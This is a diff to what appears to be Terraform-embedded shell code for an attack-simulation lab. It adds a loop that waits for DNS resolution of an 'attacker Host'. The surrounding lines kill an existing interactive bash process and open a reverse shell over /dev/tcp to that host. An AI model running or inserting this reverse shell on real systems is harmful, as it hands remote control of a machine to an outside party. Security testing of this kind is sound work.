@@ -17,6 +17,30 @@ locals {
         sleep 10
     done
     log "attacker Host: ${local.host_ip}:${local.host_port}"
+    server="${local.host_ip}"
+    timeout=600
+    start_time=$(date +%s)
+    # Check if $server is an IP address
+    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        log "server is set to IP address $server, no need to resolve DNS"
+    else
+        log "checking dns resolution: $server"
+        while true; do
+            ip=$(dig +short $server)
+            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
+                current_time=$(date +%s)
+                elapsed_time=$((current_time - start_time))
+                if [ $elapsed_time -gt $timeout ]; then
+                    echo "DNS resolution for $server timed out after $timeout seconds"
+                    exit 1
+                fi
+                sleep 1
+            else
+                echo "$server resolved to $ip"
+                break
+            fi
+        done
+    fi
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
     log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
     while true; do
